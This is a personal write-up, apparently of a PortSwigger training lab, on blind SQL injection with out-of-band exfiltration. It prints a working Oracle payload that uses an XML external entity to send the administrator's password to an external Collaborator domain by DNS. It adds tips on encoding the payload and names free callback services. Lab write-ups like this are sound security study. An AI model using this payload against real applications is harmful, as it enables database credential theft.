+++
date = '2026-07-16T15:24:16+08:00'
draft = false
title = "Blind SQL injection with out-of-band data exfiltration | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = 'Kinda important to review'
showLastUpdated = true
+++

(lab requires Burp Pro)

The application's tracking cookie is still vulnerable to SQLi. But unlike previous labs, the SQL query is executed asynchronously and has no effect on the application's response. So all our methods previously will fail to yield results.

However, we can trigger out-of-band interactions with an external domain. There are quite a lot of network protocols that we can use but the most likely to succeed is **DNS**, since almost all networks should allow outbound DNS resolution (or it will break duh). The syntax for data exfil can be found in this [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) here, quite complex syntax so I won't dive too deep into that for this writeup.
![](/images/viber_image_2026-07-16_15-41-58-270.jpg)

The URL-decoded query looks like this:
```sql
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.lh6twdgij00gynt259mozb5k4ba2y1mq.oastify.com/"> %remote;]>'),'/l') FROM dual--
```
Remember to separate the queries with a semicolon, or `UNION SELECT` otherwise it won't work. Also keep in mind to URL-encode everything (yes including the injected `SELECT` query, took me a good 10 mins), and comment out whatever residue left at the end.

After that, we can review the log for our exfiltrated data:
![](/images/viber_image_2026-07-16_15-42-27-764.jpg)
Though this lab requires you to have Burp Pro installed, in real-work settings we can substitute Collaborator with `webhook.site` or `interact.sh`, both free.